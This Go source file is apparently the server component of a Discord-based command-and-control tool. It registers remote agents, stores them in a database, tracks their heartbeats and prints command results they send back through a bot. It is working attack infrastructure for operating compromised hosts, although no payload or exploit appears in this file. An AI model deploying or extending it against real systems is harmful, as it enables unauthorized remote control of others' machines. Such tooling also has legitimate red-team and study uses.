package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	// "flag"

	"github.com/emmaunel/DiscordGo/pkg/agents"
	"github.com/emmaunel/DiscordGo/pkg/cli"
	"github.com/emmaunel/DiscordGo/pkg/message"
	"github.com/emmaunel/DiscordGo/pkg/util"
	"github.com/emmaunel/DiscordGo/pkg/util/constants"

	"github.com/bwmarrin/discordgo"
	"github.com/fatih/color"
)

// TODO: Create a flag --mode
// --mode cli and --mode gui(discord)
func main() {
	util.CreateDatabaseAndTable()
	util.LoadFromDB()
	dg, err := discordgo.New("Bot " + constants.BotToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	dg.AddHandler(messageCreator)
	dg.AddHandler(heartBeat)

	go checkAndUpdateAgentStatus(1)

	color.Red(cli.ASCIIArt)
	go cli.Shell(dg)

	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	// fmt.Println("Server is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	fmt.Println("Exiting server. \n All agent will be deleted unless they reconnect")
	// Cleanly close down the Discord session.
	dg.Close()
}

func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate) {
	var messageJSON message.Message
	json.Unmarshal([]byte(m.Content), &messageJSON)

	if messageJSON.MessageType == message.MESSAGE_NEW {
		color.Green("\n[+] New agent connected: " + messageJSON.AgentID + "\n")
		messageSplit := strings.Split(messageJSON.Message, ":")
		//insert statement
		util.InsertAgentToDB(messageJSON.AgentID, messageSplit[0], messageSplit[1], messageSplit[2])
		// Add to the agents list
		agents.AddNewAgent(messageJSON.AgentID, messageSplit[0], messageSplit[1], messageSplit[2])
		cli.MainCompleter()
	} else if messageJSON.MessageType == message.MESSAGE_DISCONNECT {
		color.Red("\n[-] Agent " + messageJSON.AgentID + " disconnected\n")
		agents.RemoveAgent(messageJSON.AgentID)
		util.RemoveAgentFromDB(messageJSON.AgentID)
		cli.MainCompleter()
	} else if messageJSON.MessageType == message.MESSAGE_OUTPUT {
		color.Blue("\n[!] Result from " + messageJSON.AgentID) // Change to IP
		color.Blue(messageJSON.Message)
	} else if messageJSON.MessageType == message.MESSAGE_PONG {
		color.Green("\n[!] Agent " + messageJSON.AgentID + " is still up")
	}
}

// I make this fucntion because when I checked for heartbeat, the server for
//some reason never sees the CONNECT message
func heartBeat(dg *discordgo.Session, m *discordgo.MessageCreate) {
	var messageJSON message.Message
	json.Unmarshal([]byte(m.Content), &messageJSON)

	// fmt.Println("bloop")
	// checkAndUpdateAgentStatus(3)

	if messageJSON.MessageType == message.MESSAGE_HEARTBEAT {
		util.UpdateAgentTimestamp(messageJSON.AgentID, messageJSON.Message)
	}

}

func checkAndUpdateAgentStatus(heartbeatDuration int) {
	agents.Agents = nil //dumb solution
	pulseDelay := time.Duration(10)
	tick := time.NewTicker(time.Second * pulseDelay)

	for range tick.C {
		for _, agent := range agents.Agents {
			currentMinute := time.Now().Minute()
			agentTimeStampMinute, _ := strconv.Atoi(strings.Split(agent.Timestamp, ":")[0])

			// fmt.Println("CurrentMinute: ", currentMinute)
			// fmt.Println("AgentTimeStamp: ", agentTimeStampMinute)

			if (currentMinute - agentTimeStampMinute) >= heartbeatDuration {
				// fmt.Println("The minute is greater than ", heartbeatDuration)
				util.UpdateAgentStatus(agent.UUID, "Dead")
			} else {
				util.UpdateAgentStatus(agent.UUID, "Alive")
			}

		}
	}

}
